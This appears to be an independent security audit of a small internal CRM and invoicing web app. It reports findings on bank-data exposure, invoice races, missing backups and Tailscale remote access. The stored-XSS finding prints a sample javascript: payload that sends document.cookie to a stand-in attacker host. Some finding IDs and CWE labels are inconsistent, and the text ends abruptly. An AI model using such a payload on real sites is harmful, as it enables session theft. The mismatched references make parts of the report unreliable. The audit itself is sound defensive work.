# CYRAOPS — BUSINESS LAUNCH MVP & SHARED ACCESS READINESS
## Final Independent Engineering & Security Sign-Off Audit

**Audit Date:** November 7, 2026  
**Auditor:** Principal Software Architect & Lead Security Engineer (Independent Audit)  
**Target Environment:** Development Only (`/Users/tanveersinghsaini/Desktop/locally hosted app dev`)  
**Active Database:** `company_os_dev` (PostgreSQL 17 on `127.0.0.1:5432`, 64 tables)  
**Production Status:** Strictly Preserved & Untouched (`company_os`, 44 tables)  
**Deliverable Document:** `docs/business-launch/CYRAOPS_BUSINESS_LAUNCH_FINAL_INDEPENDENT_SIGNOFF.md`

---

## 1. Executive Verdict & Four-Pillar Decision Matrix

This independent engineering and security audit evaluates the recently implemented **Cyraops Business Launch MVP** and the proposed **Shared Remote Access Architecture**. The objective is to determine operational readiness for two internal collaborators (Founder/Owner & Technical Lead) to acquire client projects, draft proposals, manage project milestones, and track invoicing without compromising data safety or application security.

### Four-Pillar Verdict Summary

```
┌─────────────────────────────────────────────────────────────┬─────────────────┐
│ Evaluation Pillar                                           │ Audit Verdict   │
├─────────────────────────────────────────────────────────────┼─────────────────┤
│ Pillar A: Business Launch MVP — Internal Use                │ CONDITIONAL GO  │
│ Pillar B: Shared Remote Access — Two Collaborators          │ CONDITIONAL GO  │
│ Pillar C: Real Client & Financial Data                      │ NO-GO           │
│ Pillar D: Public Client Access                              │ NO-GO           │
└─────────────────────────────────────────────────────────────┴─────────────────┘
```

### Operational Summary by Pillar

1. **Pillar A: Business Launch MVP — Internal Use (`CONDITIONAL GO`)**
   - **Status:** The end-to-end commercial lifecycle pipeline (Opportunity Intake → Commercial Proposal → Deal Won → Project Conversion → Milestones → Tasks → Client Billing → Project Closeout) is structurally implemented and operable.
   - **Conditions:** Internal use between the two founders on local machines is authorized **only after** applying immediate mitigations for:
     - `F-BL-01` (Stored XSS vector via unvalidated `externalUrl` in CRM deals)
     - `F-BL-02` (Plaintext bank/tax information in `Workspace.registrationDetails` exposed to `MEMBER` users via `GET /api/workspace`)
     - `F-BL-04` (Unverified synthetic portfolio items marked `isRealClient = true` in the database).

2. **Pillar B: Shared Remote Access — Two Collaborators (`CONDITIONAL GO`)**
   - **Status:** Remote sharing of web management interfaces over private Tailscale mesh (`tailscale serve --bg 3001`) or Cloudflare Tunnel is fundamentally feasible. Session cookies utilize `HttpOnly`, `SameSite=Lax`, and `Secure` over HTTPS; `sameOrigin` CSRF guards accommodate proper host headers.
   - **Blockers & Limitations:** 
     - LiveKit Voice/Video Calling (`F-BL-08`) will **completely fail** for remote collaborators because `LIVEKIT_URL` is hardcoded to loopback `http://127.0.0.1:7880`.
     - Mac host sleep settings (`pmset -g sleep 1`) will suspend networking when idle unless `caffeinate` is executed (`F-BL-09`).
     - Automated reboot persistence (`Launchd`) is not installed (`F-BL-10`).
     - Tailscale Commercial Licensing requires a paid Standard plan (\$8/user/month) for commercial entities (`F-BL-11`).

3. **Pillar C: Real Client & Financial Data (`NO-GO`)**
   - **Critical Blocker:** **No automated backup script exists on disk** (`scripts/backup-db.sh` is missing), no automated cron/launchd snapshots exist, off-site replication is not configured, and no disaster recovery restore drill has ever been executed (`F-BL-06`).
   - Storing real financial records, client contracts, and bank accounts on an unbacked-up laptop filesystem constitutes an unacceptable catastrophic data loss risk.
   - Client invoicing permits non-atomic sequence collisions (`F-BL-03`) and unvalidated overpayments (`F-BL-12`).

4. **Pillar D: Public Client Access (`NO-GO`)**
   - **Status:** The Cyraops application has **no client-facing portal, no third-party authentication layer, no self-service quote acceptance engine, and no public payment gateway integration**.
   - Direct public exposure via Tailscale Funnel or unauthenticated reverse proxies must remain strictly forbidden.

---

## 2. Business Launch Feature-by-Feature Status

| Subsystem / Feature | Functional Readiness | Security & Data Integrity | Operational Status |
| :--- | :--- | :--- | :--- |
| **Workspace Profile & Settings** | High: Form inputs persist correctly to PostgreSQL | High Risk: `registrationDetails` exposed to non-owners in GET (`F-BL-02`) | Partially Ready (Mask bank data) |
| **Launch Readiness Checklist** | High: 8 operational categories seeded as `NOT_STARTED` | Good: Status updates verified, completedAt recorded | **Production Ready** |
| **Company Presence & Channels** | High: Platform URLs persist to `socialLinks` JSON | Good: Validated JSON string persistence | **Production Ready** |
| **Services Catalogue** | Low: Backend API complete (`/api/company/services`); **0 frontend UI** | Neutral: Starting rates present in API seed | Incomplete (No UI, `F-BL-05`) |
| **Portfolio & Case Studies** | Low: Backend API complete (`/api/company/portfolio`); **0 frontend UI** | Critical Risk: Synthetic items stored with `isRealClient=true` (`F-BL-04`) | Blocked (Requires flag reset) |
| **Opportunity Intake (CRM)** | High: Source platforms (Upwork, Freelancer, etc.), follow-up dates | High Risk: Stored XSS via `externalUrl` (`F-BL-01`) | Fix Required (`externalUrl` regex) |
| **Proposal Generation** | High: Markdown scope, deliverables, INR pricing, versioning | Moderate: Manual operator click records acceptance (`F-BL-07`) | Usable Internally (Auditing gap) |
| **Project Delivery & Milestones** | High: Milestones with deliverables, fees, completion dates | Good: Foreign key cascade to Project, activity logged | **Production Ready** |
| **Project Tasks & Discussion** | High: Project posts separated from task comments | Good: Member-only project discussion access | **Production Ready** |
| **Accounts Receivable Invoicing** | High: Billing tab, status lifecycle, balance calculations | Moderate: Concurrency collision (`F-BL-03`), overpayment (`F-BL-12`) | Usable Internally (Low concurrency) |
| **Project Closeout Checklist** | High: Handover verification standards before completion | Good: Front-end checklist gate enforced | **Production Ready** |
| **Executive Attention Dashboard** | High: INR (`₹`) currency fixed, daily operations alerts | Good: Real database aggregation | **Production Ready** |

---

## 3. Comprehensive Security Review

### 3.1 Authentication & Session Management
- **Token Cryptography:** Sessions employ high-entropy cryptographically random tokens stored as SHA-256 hashes (`tokenHash`) in PostgreSQL. Raw session tokens are never stored in the database.
- **Cookie Flags:** `SESSION_COOKIE` (`company_session`) is transmitted with:
  - `httpOnly: true` (prevents JavaScript DOM extraction)
  - `sameSite: "lax"` (mitigates cross-site request forgery during top-level navigations)
  - `secure: true` (dynamically enforced whenever request protocol or `x-forwarded-proto` is HTTPS)
  - `path: "/"`
- **Password Invalidation:** Password updates trigger immediate revocation of all active database session records for that user.

### 3.2 Role-Based Access Control (RBAC) Boundaries
- **Workspace Administration:** `PATCH /api/workspace` strictly enforces `if (user.role !== "OWNER") return jsonError(..., 403)`.
- **CRM Deal Ownership:** Non-admin `MEMBER` users cannot modify deals owned by other team members, cannot archive deals, and cannot reassign deals to other users (`PATCH /api/crm/deals/[id]`).
- **Project Authorization:** Member access to project discussions, files, and milestones requires verified project membership (`projectMember` record) or `OWNER`/`ADMIN` role.

### 3.3 CSRF & Origin Validation
- State-mutating routes (`POST`, `PATCH`, `DELETE`) invoke `sameOrigin(request)`.
- The handler inspects `origin`, `referer`, `host`, `x-forwarded-host`, and `sec-fetch-site`.
- When proxied via Tailscale Serve or Cloudflare Tunnel, requests presenting matching host and origin headers pass without bypassing origin safety.

---

## 4. Sensitive Data & Privacy Review

### Finding `F-BL-02`: Sensitive Tax & Bank Details Exposed in Plaintext to All Roles

```
Finding ID: F-BL-02
Severity: High
CWE: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
Component: src/app/api/workspace/route.ts, src/components/modules/settings.tsx
```

#### Evidence:
1. In `src/app/api/workspace/route.ts`:
   ```typescript
   const workspaceSelect = {
     id: true,
     name: true,
     // ...
     registrationDetails: true,
     // ...
   };

   export async function GET(request: NextRequest) {
     const user = await userFromRequest(request);
     if (!user) return jsonError("Unauthorized", 401);

     const workspace = await db.workspace.findUnique({
       where: { id: "main" },
       select: workspaceSelect,
     });
     return Response.json({ workspace });
   }
   ```
2. In `src/components/modules/settings.tsx` (lines 364-372):
   ```tsx
   <div className="space-y-1.5">
     <label className="text-xs font-semibold text-[var(--muted)]">Tax / GST / Bank Account Details</label>
     <textarea
       name="registrationDetails"
       defaultValue={workspace?.registrationDetails ?? ""}
       rows={3}
       placeholder="GSTIN, PAN, or Bank Transfer Details (Printed on Client Invoices)"
       className="..."
     />
   </div>
   ```

#### Actual Risk:
- Any authenticated user—including non-owner collaborator accounts (`MEMBER`) or contractors invited in the future—receives the raw plaintext string containing company PAN, GSTIN, and bank account numbers upon loading the workspace.
- The data is stored in unencrypted `TEXT` format in PostgreSQL.
- Although the Settings UI disables the Save button for non-owners, the sensitive data is fully exposed in both the HTTP JSON response and DOM textarea.
- Furthermore, client invoices do not even ingest or print this field.

#### Recommended Correction:
1. Restrict `registrationDetails` in `GET /api/workspace`: only return the field if `user.role === "OWNER"`. For `MEMBER` users, omit or return a masked value (e.g. `GSTIN: 29*** | Bank: HDFC Bank A/C ending in 4321`).
2. Explicitly document that Internet banking passwords, UPI PINs, and transaction passwords must **never** be stored in the database.
3. Operational Blocker: **Blocks real internal use if sensitive banking credentials/PAN are stored before masking is implemented.** Does not block remote access itself.

---

## 5. Proposal & Pricing Review

### 5.1 Pricing Model & Currency Normalization
- All proposal pricing fields and deal values are explicitly denominated in **Indian Rupees (`INR` / `₹`)**.
- The dashboard health indicator and pipeline calculation were audited and confirmed free of foreign currency symbols (`$`), correctly displaying formatted Rupee amounts (`₹35,000`).
- Proposal pricing uses `Float` (`DOUBLE PRECISION` in PostgreSQL). For high-precision accounting, integer paise or Prisma `Decimal` is recommended.

### 5.2 Finding `F-BL-11`: Proposal Acceptance Auditing Gap

```
Finding ID: F-BL-11
Severity: Medium
CWE: CWE-778 (Insufficient Logging / Auditability)
Component: src/app/api/crm/proposals/[id]/route.ts, src/components/modules/crm.tsx
```

#### Evidence:
- In `src/components/modules/crm.tsx` (lines 1262-1271):
  ```tsx
  <Button
    variant="primary"
    className="h-7 px-2.5 text-xs bg-emerald-600 hover:bg-emerald-700"
    onClick={async () => {
      await api(`/api/crm/proposals/${prop.id}`, "PATCH", { status: "ACCEPTED" });
      toast("Proposal ACCEPTED! Deal marked CLOSED_WON.");
    }}
  >
    Client Accepted ✓
  </Button>
  ```
- In `src/app/api/crm/proposals/[id]/route.ts`:
  When `status === "ACCEPTED"`, the handler sets `deal.stage = "CLOSED_WON"` and logs an internal activity entry (`advanced deal following proposal acceptance`).

#### Actual Risk:
- The `Proposal` model lacks fields for `acceptedAt`, `acceptedByUserId`, `clientAcceptanceReference` (e.g., Upwork contract URL, signed PO number, email message ID), and `clientSignatoryName`.
- Acceptance is purely a manual internal operator button click. While adequate for MVP internal coordination, this cannot be represented to auditors, tax authorities, or clients as legally binding or verifiable client acceptance.

#### Recommended Correction:
- Add a modal prompt when clicking "Client Accepted ✓" requiring the operator to enter:
  - Acceptance Channel (Upwork Message, Email, Signed Contract, WhatsApp)
  - Contract / Message ID Reference
  - Optional Acceptance Notes
- Record these fields in `Proposal.acceptanceDetails` (JSON or dedicated columns).
- Operational Blocker: **Does not block internal use.** Blocks client-dispute audit readiness.

---

## 6. Portfolio & Service Authenticity Review

### Finding `F-BL-04`: Synthetic Portfolio Case Studies Stored as Verified Real Clients

```
Finding ID: F-BL-04
Severity: High
CWE: CWE-1059 (Misleading Information / Data Provenance Violation)
Component: src/app/api/company/portfolio/route.ts, company_os_dev.PortfolioItem
```

#### Evidence:
Direct database inspection of `company_os_dev` table `PortfolioItem`:
```sql
SELECT id, title, "clientName", "isRealClient", "isPublic", metrics FROM "PortfolioItem";
```
Output:
```
           id              |                          title                          |     clientName      | isRealClient | isPublic |                            metrics                            
---------------------------+---------------------------------------------------------+---------------------+--------------+----------+---------------------------------------------------------------
 cmw543rmu000oxtqu39q11v26 | High-Availability E-Commerce Infrastructure on AWS      | Digital Retail Inc. | t            | t        | 99.99% Uptime, 45% Latency Reduction, Zero-Downtime Migration
 cmw543rmv000pxtqukcje952v | Fintech CI/CD Pipeline & Zero-Downtime Containerization | PayStream Solutions | t            | t        | Release time: 180m -> 4m, 3x weekly deploys, zero downtime
```
In `src/app/api/company/portfolio/route.ts` (lines 22-25, 40-43):
Both sample case studies ("Digital Retail Inc." and "PayStream Solutions") are seeded with `isRealClient: true` and `isPublic: true`.

#### Actual Risk:
- "Digital Retail Inc." and "PayStream Solutions" are fictitious demonstration templates.
- Having `isRealClient = true` and `isPublic = true` hardcoded presents a critical compliance and truthfulness risk: if these records are synced to marketing materials, proposals, or platform bids, the business would be falsely claiming non-existent client engagements and fabricated performance metrics.

#### Recommended Correction:
1. Update existing records in `company_os_dev`:
   ```sql
   UPDATE "PortfolioItem" SET "isRealClient" = false, "isPublic" = false;
   ```
2. Modify `DEFAULT_PORTFOLIO` in `src/app/api/company/portfolio/route.ts` to set `isRealClient: false` and `isPublic: false` by default for sample items.
3. Operational Blocker: **Blocks outbound sales / proposal submission** until sample records are flagged as internal templates.

---

## 7. Project Acquisition & CRM Security Review

### Finding `F-BL-01`: Stored XSS Vector via Unsanitized External Job URLs

```
Finding ID: F-BL-01
Severity: High
CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation / Cross-Site Scripting)
Component: src/app/api/crm/deals/route.ts, src/components/modules/crm.tsx
```

#### Evidence:
1. In `src/app/api/crm/deals/route.ts` (line 29) & `[id]/route.ts` (line 26):
   ```typescript
   externalUrl: z.string().trim().max(1000).optional().nullable().or(z.literal("")),
   ```
   The Zod schema validates string length only. It does not validate URL scheme (`http:` / `https:`).
2. In `src/components/modules/crm.tsx` (lines 1327-1334 and 1454-1463):
   ```tsx
   {selectedDeal.externalUrl && (
     <a
       href={selectedDeal.externalUrl}
       target="_blank"
       rel="noopener noreferrer"
       className="..."
     >
       <ExternalLink size={12} /> Open Job Posting ↗
     </a>
   )}
   ```

#### Actual Risk:
- An attacker, an untrusted webhook, or an intake payload can submit an `externalUrl` with a malicious scheme such as:
  `javascript:eval(atob('...'))` or `javascript:document.location='http://attacker.com/steal?c='+document.cookie`
- When either collaborator clicks "Open Job Posting ↗" or the external link icon in the CRM pipeline, the JavaScript payload executes within the collaborator's browser under the Cyraops origin.

#### Recommended Correction:
Validate the URL schema strictly in `createDealSchema` and `updateDealSchema`:
```typescript
externalUrl: z
  .string()
  .trim()
  .max(1000)
  .refine(
    (val) => !val || /^https?:\/\//i.test(val),
    "External URL must begin with http:// or https://"
  )
  .optional()
  .nullable(),
```
Operational Blocker: **Blocks ingestion of public/untrusted opportunity links** until patched.

---

## 8. Invoicing & Accounts Receivable Safety Review

### 8.1 Finding `F-BL-03`: Non-Atomic Concurrency Collision in Invoice Number Generation

```
Finding ID: F-BL-03
Severity: Medium
CWE: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)
Component: src/app/api/billing/invoices/route.ts
```

#### Evidence:
In `src/app/api/billing/invoices/route.ts` (lines 88-95):
```typescript
const dateStr = new Date().toISOString().slice(0, 7).replace("-", "");
const countThisMonth = await db.clientInvoice.count({
  where: {
    invoiceNumber: { startsWith: `INV-${dateStr}-` },
  },
});
const seq = String(countThisMonth + 1).padStart(4, "0");
const invoiceNumber = `INV-${dateStr}-${seq}`;
```
Prisma schema constraint:
```prisma
model ClientInvoice {
  invoiceNumber String @unique
}
```

#### Actual Risk:
1. **Race Condition:** If two collaborators issue an invoice simultaneously, both read `countThisMonth = N`, both attempt to insert `INV-YYYYMM-(N+1)`, and the second insert throws a Prisma Unique Constraint Violation (`P2002`), returning an unhandled 500 error to the second user.
2. **Deletion Gap:** If 3 invoices are created (`0001`, `0002`, `0003`) and invoice `0002` is deleted, `countThisMonth` becomes 2. The next invoice attempts to create `0003`, causing an immediate collision with existing `0003`.

#### Recommended Correction:
Use an atomic database sequence (e.g. `CREATE SEQUENCE client_invoice_seq`) or wrap the invoice creation in a serializable transaction with retry logic.
Operational Blocker: Low risk for 2 collaborators with low transaction volume, but must be hardened before high-volume billing.

### 8.2 Finding `F-BL-12`: Missing Overpayment Validation

```
Finding ID: F-BL-12
Severity: Medium
CWE: CWE-20 (Improper Input Validation)
Component: src/app/api/billing/invoices/[id]/route.ts
```

#### Evidence:
In `src/app/api/billing/invoices/[id]/route.ts`:
```typescript
const updateInvoiceSchema = z.object({
  amountPaid: z.number().min(0).optional(),
  // ...
});
```
The PATCH handler accepts any non-negative `amountPaid` and automatically marks the invoice as `PAID` if `amountPaid >= targetAmount`, without verifying that `amountPaid <= targetAmount`.

#### Actual Risk:
Accidental input errors (e.g. entering ₹150,000 instead of ₹15,000) result in distorted Accounts Receivable balances and inflated revenue figures in financial summaries.

#### Recommended Correction:
Reject payments where `amountPaid > targetAmount`:
```typescript
if (data.amountPaid !== undefined && data.amountPaid > targetAmount) {
  return jsonError(`Payment amount (₹${data.amountPaid}) cannot exceed invoice amount (₹${targetAmount})`, 400);
}
```

---

## 9. Database Migration Review

### Migration `20261106033000_business_launch_foundation`
- **Application Status:** Fully applied to `company_os_dev` on Nov 6, 2026.
- **Table Additions (5):**
  - `BusinessReadinessItem` (Primary key `id`, indexes on `[category, status]` and `[ownerId]`)
  - `Proposal` (Primary key `id`, foreign keys to `Deal` [Cascade] and `User` [Restrict], indexes on `[dealId, status]` and `[authorId]`)
  - `ProjectMilestone` (Primary key `id`, foreign key to `Project` [Cascade], index on `[projectId, status]`)
  - `ClientInvoice` (Primary key `id`, unique index on `invoiceNumber`, foreign keys to `Project`, `Deal`, `Company` [SetNull])
  - `PortfolioItem` (Primary key `id`, index on `[category, isPublic]`)
- **Table Alterations (3):**
  - `Deal`: Added `externalUrl`, `followUpDate`, `nextAction`, `sourcePlatform` with indexes on `sourcePlatform` and `followUpDate`.
  - `ServiceCapability`: Added `expectedDuration`, `isActive`, `pricingModel`, `startingPrice`, `typicalDeliverables`.
  - `Workspace`: Added `address`, `description`, `industry`, `logoUrl`, `phone`, `registrationDetails`, `socialLinks`, `tagline`, `timezone`, `website`.
- **Integrity Assessment:** Migration is strictly additive and non-destructive. Foreign keys and cascade rules conform to relational standards.

---

## 10. Backup & Disaster Recovery Verification

### Finding `F-BL-06`: Missing Backup Script, Absent Scheduling, and Zero Restore Proof

```
Finding ID: F-BL-06
Severity: High (Critical Data Loss Hazard)
CWE: CWE-656 (Reliance on Security or Reliability Through Obscurity)
Component: scripts/backup-db.sh, crontab, system launchd
```

#### Detailed 12-Point Backup & DR Checklist Audit:

```
┌────┬────────────────────────────────────────────────────────┬────────┬───────────────────────────────────────────┐
│ #  │ Inspection Item                                        │ Status │ Audit Observation                         │
├────┼────────────────────────────────────────────────────────┼────────┼───────────────────────────────────────────┤
│ 1  │ Script verifies current_database() = 'company_os_dev'  │ FAIL   │ Script does not exist on disk             │
│ 2  │ Pinned expected database host and port                 │ FAIL   │ Script does not exist on disk             │
│ 3  │ Consistent PostgreSQL dump format                      │ FAIL   │ Script does not exist on disk             │
│ 4  │ Appropriate custom-format file extension               │ FAIL   │ Documented example improperly used .sql   │
│ 5  │ Integrity check via pg_restore --list                  │ FAIL   │ Not implemented                           │
│ 6  │ Incomplete backup prevented from replacing good backup │ FAIL   │ No trap or atomic rename on failure       │
│ 7  │ Restricted filesystem permissions (chmod 600/700)      │ FAIL   │ No backup automation on disk              │
│ 8  │ Retention routine limited to verified backups          │ FAIL   │ No retention logic installed              │
│ 9  │ Process includes application uploaded files (uploads/) │ FAIL   │ Uploaded files completely omitted         │
│ 10 │ Off-site storage actually configured (S3/R2)           │ FAIL   │ 0 remote offsite storage configured       │
│ 11 │ Off-site backup encrypted at rest                      │ FAIL   │ No encryption keys or tools configured    │
│ 12 │ Real database restore test performed and documented    │ FAIL   │ Zero documented restore drills            │
└────┴────────────────────────────────────────────────────────┴────────┴───────────────────────────────────────────┘
```

#### Evidence:
1. `ls -la scripts/backup-db.sh` -> **File does not exist** (directory contains migration and seeding scripts only).
2. `crontab -l` -> `crontab: no crontab for tanveersinghsaini` (0 automated backup jobs installed).
3. The proposed architecture guide (`CYRAOPS_SHARED_ACCESS_READINESS.md`) documented an uninstalled sample script using `pg_dump -F c` with a `.sql` extension, omitting upload directories, without integrity verification (`pg_restore --list`), and without an exit trap.

#### Actual Risk:
If real client contracts, proposals, and invoices are entered into Cyraops, any local disk failure, accidental directory deletion, or PostgreSQL corruption will cause **permanent, catastrophic data loss**.

#### Recommended Correction:
1. Create a verified, production-grade backup script at `scripts/backup-db.sh` that:
   - Validates `SELECT current_database() = 'company_os_dev'`.
   - Dumps to custom binary format (`.dump`) into a temporary file.
   - Verifies header integrity using `pg_restore --list "$TMP_FILE" > /dev/null`.
   - Atomically moves the verified dump into the backup repository.
   - Archives `./uploads` alongside database dumps.
   - Prunes only backups older than 14 days.
2. Install a macOS LaunchDaemon or cron entry executing daily at 02:00 AM.
3. Perform and document a complete test restore into a temporary scratch database (`company_os_restore_test`).
4. Operational Blocker: **Strictly blocks Pillar C (Real Client & Financial Data).**

---

## 11. Shared Remote Access Architecture Readiness

### 11.1 Access Patterns Comparison

1. **Option A: Tailscale WireGuard Mesh (Recommended for Web UI):**
   - End-to-end encrypted WireGuard tunnel directly between collaborator laptops.
   - Zero public router ports opened; PostgreSQL port 5432 remains pinned to `127.0.0.1`.
   - HTTPS termination available via `tailscale serve --bg 3001`.
2. **Option B: Cloudflare Zero Trust Tunnel:**
   - Outbound TLS tunnel from Mac host to Cloudflare edge (`cloudflared`).
   - Enables clean custom domain (`ops.cyraops.com`) protected by Cloudflare Access OTP email policy.
   - WebRTC UDP media cannot pass through standard HTTP Cloudflare tunnels.

### 11.2 Finding `F-BL-07`: `APP_URL` Validator Incompatibility with Tailscale HTTP Hostnames

```
Finding ID: F-BL-07
Severity: High
CWE: CWE-20 (Improper Input Validation)
Component: src/lib/urls.ts
```

#### Evidence:
In `src/lib/urls.ts`:
```typescript
export function isPrivateOrLocalHost(hostname: string): boolean {
  // Checks localhost, .local, .internal, and RFC 1918 private IPv4 ranges (10.x, 172.16-31.x, 192.168.x)
}
```
When `validateAppUrl("http://tanveer-macbook.tailnet-xyz.ts.net:3001", false)` is called:
- Hostname ends with `.ts.net`, which is not recognized by `isPrivateOrLocalHost`.
- Tailscale IP addresses belong to the RFC 6598 CGNAT block (`100.64.0.0/10`), which is also omitted from `isPrivateOrLocalHost`.
- As a result, setting `APP_URL="http://...ts.net:3001"` causes `validateAppUrl` to return:
  `{ isValid: false, error: "HTTP is only permitted for localhost or private LAN testing; use HTTPS for non-local addresses" }`
- Consequently, invitation links generated via `buildSetupUrl` return `null`.

#### Recommended Correction:
1. When using Tailscale, **always terminate with HTTPS** using Tailscale Serve:
   ```bash
   tailscale serve --bg 3001
   ```
   Set `APP_URL="https://<device>.<tailnet>.ts.net"`.
2. Alternatively, update `isPrivateOrLocalHost` in `src/lib/urls.ts` to recognize `.ts.net` and `100.64.0.0/10`.

---

### 11.3 Finding `F-BL-08`: Hardcoded Loopback `LIVEKIT_URL` Breaks Remote Calling

```
Finding ID: F-BL-08
Severity: High
Component: .env, src/app/api/calls/[id]/token/route.ts
```

#### Evidence:
- In `.env`: `LIVEKIT_URL="http://127.0.0.1:7880"`
- In `src/app/api/calls/[id]/token/route.ts`:
  When a user requests a call token, the server returns `{ token, url: process.env.LIVEKIT_URL }`.
- Collaborator B's remote browser receives `url: "http://127.0.0.1:7880"` and attempts to open WebSockets against its **own** local machine loopback, where no LiveKit daemon is listening.

#### Actual Risk:
LiveKit group calling, screen sharing, and audio/video calls are **completely non-functional for remote collaborators**.

#### Recommended Correction:
To enable remote calling:
- The host's LiveKit server must bind to the Tailscale interface IP (e.g. `100.x.y.z:7880`).
- `LIVEKIT_URL` must be set to `http://<tailscale-ip>:7880` or an HTTPS domain proxied to LiveKit.
- Collaborator B must be connected to the Tailnet to route UDP media.

---

### 11.4 Finding `F-BL-09`: Host Power Management (`sleep 1`) Suspends Collaborator Access

```
Finding ID: F-BL-09
Severity: Medium
Component: Host macOS Power Management (pmset)
```

#### Evidence:
Inspection via `pmset -g`:
```
sleep 1 (sleep prevented by Gemini, powerd)
displaysleep 30
womp 0 (Wake-on-LAN disabled)
```

#### Actual Risk:
When the MacBook host is left unattended or the clamshell lid is closed, macOS enters system sleep within 1 minute, cutting off network connections and terminating Collaborator B's session.

#### Recommended Correction:
When hosting for remote collaborators:
- Execute `caffeinate -dimsu` in a persistent terminal session, or
- Connect to AC power and configure system preferences to "Prevent automatic sleeping on power adapter when the display is off".

---

## 12. Tailscale Commercial Licensing Note

### Finding `F-BL-10`: Licensing Restriction on Tailscale Free Personal Tier

```
Finding ID: F-BL-10
Severity: Low (Commercial Compliance)
Component: Architecture Cost Model
```

#### Assessment:
- The proposed architecture document (`CYRAOPS_SHARED_ACCESS_READINESS.md`) assumed Tailscale is free for up to 3 users.
- Tailscale's official pricing terms specify that the **Personal (Free) Plan** is strictly intended for **non-commercial, personal use**.
- Operating a registered IT services business, acquiring commercial clients, and generating revenue requires the **Tailscale Starter or Standard Plan**, currently listed at **\$8 per user per month** (\$16/month for 2 collaborators).
- Alternatively, teams wishing to avoid software subscription costs can evaluate:
  - **Cloudflare Zero Trust Free Tier** (free for up to 50 users for commercial organizations).
  - Direct WireGuard VPN hosted on a \$4/month VPS or dynamic DNS setup.

---

## 13. Test Quality & Verification Audit

### 13.1 Accurate Test Classification
The test suite in `src/lib/business-launch.test.ts` (21 tests) was independently analyzed:
- **Classification:** **In-Process Route Integration Tests with Live PostgreSQL Database**.
- **What they are:** Direct invocations of Next.js Route Handler functions (`workspaceGET`, `dealsPOST`, `invoicesPOST`, `dashboardGET`) using Node.js `NextRequest` objects against the live `company_os_dev` database.
- **What they are NOT:** They are **not** Browser End-to-End (E2E) tests. No browser instance (Chromium/Playwright), DOM renderer, or client-side JavaScript was executed.

### 13.2 Collaborator Role Coverage
The integration suite successfully verifies dual-collaborator role separation:
- Creates real accounts for `Tanveer Singh (Founder/Owner)` (`OWNER`) and `DevOps Technical Lead` (`MEMBER`).
- Confirms non-owners cannot modify workspace profile settings (HTTP 403).
- Confirms non-owners can create deals, assign to themselves, and complete project milestones.
- Confirms end-to-end transition: Deal → Proposal Review → Deal Won → Project Conversion → Milestones → Invoicing → Paid.

### 13.3 Test Suite Blindspots & Missing Tests
1. **Zero XSS / Unsafe URI Tests:** No tests attempt to supply `javascript:` or malformed schemes to `externalUrl`.
2. **Zero Concurrency Tests:** Invoicing sequence generation was tested with 1 sequential invoice only; concurrent creations were never exercised.
3. **Zero Overpayment Tests:** No tests attempt to send `amountPaid > amount`.
4. **Zero Bank Data Leakage Tests:** No tests check whether `registrationDetails` is returned to `MEMBER` users via `GET /api/workspace`.
5. **Zero Remote Network Tests:** No tests exercise Tailscale `.ts.net` URL resolution.

---

## 14. Consolidated Outstanding Findings Register

| Finding ID | Severity | Category | Description | Blocks Internal Use? | Blocks Remote Access? |
| :--- | :--- | :--- | :--- | :---: | :---: |
| **F-BL-01** | **High** | Security | Stored XSS via unvalidated `externalUrl` in CRM deals | **YES (for untrusted links)** | No |
| **F-BL-02** | **High** | Security / Privacy | Plaintext bank/tax details exposed to all roles in `GET /api/workspace` | **YES (if real bank data entered)** | No |
| **F-BL-03** | **Medium** | Concurrency | Non-atomic `ClientInvoice` number sequence generation | No | No |
| **F-BL-04** | **High** | Data Integrity | Sample portfolio case studies stored with `isRealClient = true` | **YES (for proposal/client use)** | No |
| **F-BL-05** | **Medium** | Completeness | `/api/company/services` & `/api/company/portfolio` have no frontend UI | No (Manual API only) | No |
| **F-BL-06** | **High** | Data Safety | Missing backup script, zero cron/launchd jobs, zero restore drill | **YES (for real client/invoice data)** | No |
| **F-BL-07** | **High** | Networking | `APP_URL` validator rejects Tailscale HTTP and CGNAT hostnames | No (Localhost unaffected) | **YES (for HTTP Tailscale)** |
| **F-BL-08** | **High** | Architecture | `LIVEKIT_URL` hardcoded to loopback breaks remote calling | No (Local unaffected) | **YES (for Voice/Video)** |
| **F-BL-09** | **Medium** | Infrastructure | Host Mac `sleep 1` power setting drops remote connections | No | **YES (if unattended)** |
| **F-BL-10** | **Low** | Compliance | Tailscale Free plan is non-commercial; Standard is \$8/user/mo | No | No |
| **F-BL-11** | **Medium** | Auditability | Proposal acceptance lacks operator audit reference fields | No | No |
| **F-BL-12** | **Medium** | Financial | Invoices permit unvalidated overpayment (`amountPaid > amount`) | No | No |

---

## 15. Prioritized Remediation Roadmap

### Immediate (Before Shared Remote Onboarding):
1. **Fix `externalUrl` Validation (`F-BL-01`):** Require `https?://` in `createDealSchema` and `updateDealSchema`.
2. **Mask `registrationDetails` (`F-BL-02`):** Strip or mask `registrationDetails` in `GET /api/workspace` for non-owners.
3. **Reset Portfolio Flags (`F-BL-04`):** Run `UPDATE "PortfolioItem" SET "isRealClient" = false, "isPublic" = false;`.
4. **Deploy Tailscale Serve with HTTPS (`F-BL-07`):** Run `tailscale serve --bg 3001` so `APP_URL` uses HTTPS, bypassing the HTTP local-host check.
5. **Keep Host Awake (`F-BL-09`):** Run `caffeinate -dimsu` during remote collaboration sessions.

### Before Ingesting Real Financial & Client Data:
6. **Implement and Verify Automated Backups (`F-BL-06`):**
   - Write `scripts/backup-db.sh` with `SELECT current_database()` verification and `pg_restore --list` check.
   - Install daily cron job.
   - Perform a verified test restore into `company_os_restore_test`.
7. **Harden Invoice Concurrency & Validation (`F-BL-03`, `F-BL-12`):** Add sequence locks and check `amountPaid <= targetAmount`.

### Post-Launch Hardening:
8. **LiveKit Remote Calling Routing (`F-BL-08`):** Bind LiveKit to Tailscale IP or route through private TURN/STUN.
9. **Services & Portfolio UI (`F-BL-05`):** Build frontend views for service catalog and case study authoring.
10. **Tailscale Commercial Decision (`F-BL-10`):** Upgrade Tailscale to Standard (\$16/mo) or migrate to Cloudflare Zero Trust Free Tier.

---

## 16. Final Sign-Off Verdicts

### A. Business Launch MVP — Internal Use: `CONDITIONAL GO`
> Authorized for internal business setup, lead tracking, proposal drafting, and project management by the two founders on local machines, provided that bank account details are not entered into `registrationDetails` until masked, and sample portfolio flags are reset to unverified.

### B. Shared Remote Access — Two Collaborators: `CONDITIONAL GO`
